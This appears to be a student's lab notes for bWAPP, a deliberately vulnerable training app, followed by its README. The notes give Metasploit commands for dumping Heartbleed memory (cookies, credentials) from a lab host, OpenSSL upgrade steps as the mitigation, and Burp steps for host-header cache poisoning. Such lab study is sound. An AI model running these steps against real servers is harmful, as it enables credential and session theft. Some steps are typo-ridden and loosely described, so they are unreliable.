

Install the bWPP from here
https://youtu.be/kpfdV1V4C5c


##### BufferOver-Read Exploitation ##### 


sudo su ->To give the super admin privileges 
NMAP -p 8443 –script  ssl-heartbleed  -> This will check whether the app is vulnerable for heartbleed
ipconfig – to get the ip address of the machine
msfconsole –> to exploit the vulnerability
search openssl_heartbleed -> first search exploits to heartbleed vulnerability
use auxiliary/scanner/ssl/openssl_heartbleed ->use exploit in the list (auxiliary/scanner/ssl/openssl_heartbleed)

show info   -> it will show all the information
set RHOSTS 192.168.38.128 -> Set the RHOSTS
set RPORT 8443 -> Set the RPORT 
show info -> To check whether the RHOSTS and RPORTs are set
set action scan -> to scan the server
run-> start the server 
set action DUMP-> To start the attack
copy the saved bin file command
After that extract strings of binary files and save it in the results.txt
 

View the results.txt file
cat results.txt   
This file will give information which we get from the heratbleed exploitation. Some of them are the referrer header, cookie header, session cookie, login credentials and many other valuable information of this vulnerable application. Using the login credentials attacker can do many tasks in this vulnerable application.


##### BufferOver-Read Mitigation ##### 
--Upgrade the open ssl to 1.0.2 to mitigate this vulnerability--

#Install OpenSSL
sudo ./config --prefix=/usr/local/ssl --openssldir=/usr/local/ssl shared zlib
sudo make
sudo make test
sudo make install

#Configure OpenSSL Shared Libraries
cd /etc/ld.so.conf.d/
sudo nano openssl-1.0.2u.conf
  /usr/local/ssl/lib

#Save and exit

sudo ldconfig -v

#Set the path variable
sudo nano /etc/environment

#Save and exit

#And finally reloading it with:
source /etc/environment
echo $PATH

#We can now check and verify our installation
which openssl
openssl version -a

#Use OpenSSL for Self-Signed SSL Certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/my.key -out /etc/ssl/certs/my.crt

reset

#Restart the Ubuntu OS

#Check the version of openssl
openssl version -a




##### Web Cache Posioning Exploitation ##### 

First, open the Burp Suit web browser and enter the server address, set security to ow, and log in.
Then choose the bug from the list "Host Header Attack (Cache Poisoning), and reload the page to load the cache to Burp suit.
From the loaded cache data in the Burp suit, replace the host address with "www.google.com#".
Then forward it until the page appears and from the page, can select "click here" to go back to the portal
The turn interception off and the hacked result will be displayed

You can download Burp Suit from here

https://portswigger.net/burp/communitydownload



--------------
bWAPP - README
--------------

bWAPP, or a buggy web application, is a deliberately insecure web application.
bWAPP helps security enthusiasts, developers and students to discover and to prevent web vulnerabilities.
It prepares one to conduct successful penetration testing and ethical hacking projects.
What makes bWAPP so unique? Well, it has over 100 web bugs!
bWAPP covers all major known web vulnerabilities, including all risks from the OWASP Top 10 project!
It is for security-testing and educational purposes only.

It includes:

*/ Injection vulnerabilities like SQL, SSI, XML/XPath, JSON, LDAP, HTML, iFrame, OS Command and SMTP injection
*/ Cross-Site Scripting (XSS), Cross-Site Tracing (XST) and Cross-Site Request Forgery (CSRF)
*/ Unrestricted file uploads and backdoor files
*/ Authentication, authorization and session management issues
*/ Arbitrary file access and directory traversals
*/ Local and remote file inclusions (LFI/RFI)
*/ Server Side Request Forgery (SSRF)
*/ XML External Entity Attacks (XXE)
*/ Heartbleed vulnerability (OpenSSL)
*/ Shellshock vulnerability (CGI)
*/ Drupal SQL injection (Drupageddon)
*/ Configuration issues: Man-in-the-Middle, cross-domain policy file, information disclosures,...
*/ HTTP parameter pollution and HTTP response splitting
*/ Denial-of-Service (DoS) attacks
*/ HTML5 ClickJacking, Cross-Origin Resource Sharing (CORS) and web storage issues
*/ Unvalidated redirects and forwards
*/ Parameter tampering
*/ PHP-CGI vulnerability
*/ Insecure cryptographic storage
*/ AJAX and Web Services issues (JSON/XML/SOAP)
*/ Cookie and password reset poisoning
*/ Insecure FTP, SNMP and WebDAV configurations
*/ and much more...

bWAPP is a PHP application that uses a MySQL database. It can be hosted on Linux and Windows using Apache/IIS and MySQL. It can be installed with WAMP or XAMPP.

It's also possible to download our bee-box, a custom VM pre-installed with bWAPP.

This project is part of the ITSEC GAMES project. ITSEC GAMES are a fun approach to IT security education. 
IT security, ethical hacking, training and fun... all mixed together.
You can find more about the ITSEC GAMES and bWAPP projects on our blog.

We offer a 2-day comprehensive web security course 'Attacking & Defending Web Apps with bWAPP'.
This course can be scheduled on demand, at your location!
More info: http://goo.gl/ASuPa1 (pdf)

Enjoy!

Cheers

Malik Mesellem
Twitter: @MME_IT
